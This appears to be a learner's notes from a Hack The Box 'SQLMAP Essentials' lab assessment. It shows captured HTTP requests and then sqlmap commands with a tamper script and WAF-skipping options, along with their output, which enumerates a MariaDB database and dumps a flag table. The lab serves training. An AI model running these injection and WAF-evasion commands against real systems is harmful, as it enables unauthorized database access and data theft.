# SQLMAP ESSENTIALS Skills Assessment


94.237.56.188:44941

GET /maps/api/js?key=AIzaSyBVWaKrjvy3MaE7SQ74_uJiULgl1JY0H2s&sensor=false HTTP/1.1
Host: maps.googleapis.com
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: http://94.237.56.188:44941/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close


GET /css?family=Open+Sans:300,400,600,700,800 HTTP/1.1
Host: fonts.googleapis.com
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: text/css,*/*;q=0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Referer: http://94.237.56.188:44941/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

GET /maps/api/mapsjs/gen_204?csp_test=true HTTP/2
Host: maps.googleapis.com
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Accept: */*
Origin: http://94.237.56.188:44941
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://94.237.56.188:44941/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

GET /blog.html? HTTP/1.1
Host: 94.237.56.188:44941
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.56.188:44941/blog.html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

POST /action.php HTTP/1.1
Host: 94.237.56.188:52779
Content-Length: 8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://94.237.56.188:52779
Referer: http://94.237.56.188:52779/shop.html
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"id":1}

vi req.txt

sqlmap -r req.txt --banner --current-user --current-db --is-dba

[11:23:43] [INFO] testing if current user is DBA
[11:23:43] [INFO] fetching current user
[11:23:43] [INFO] retrieved: 
[11:23:43] [INFO] fetched data logged to text files under '/home/htb-ac-786011/.local/share/sqlmap/output/94.237.56.188'

sqlmap -r req.txt --tamper=between --is-dba

[11:25:56] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
a
[11:26:06] [INFO] adjusting time delay to 1 second due to good response times
dmin@localhost
current user is DBA: False

sqlmap -r req.txt --tamper=between --skip-waf --banner --current-user --current-db --is-dba

[11:28:08] [INFO] adjusting time delay to 1 second due to good response times
0.3.23-MariaDB-0+deb10u1
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
banner: '10.3.23-MariaDB-0+deb10u1'
[11:29:24] [INFO] fetching current user
[11:29:24] [INFO] resumed: admin@localhost
current user: 'admin@localhost'
[11:29:24] [INFO] fetching current database
[11:29:24] [INFO] retrieved: production
current database: 'production'
[11:30:00] [INFO] testing if current user is DBA
[11:30:00] [INFO] fetching current user
current user is DBA: False
[11:30:00] [INFO] fetched data logged to text files under '/home/htb-ac-786011/.local/share/sqlmap/output/94.237.56.188'
[11:30:00] [WARNING] your sqlmap version is outdated

[*] ending @ 11:30:00 /2023-12-27/

sqlmap -r req.txt --tamper=between --skip-waf --dump -T final_flag -D production

Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
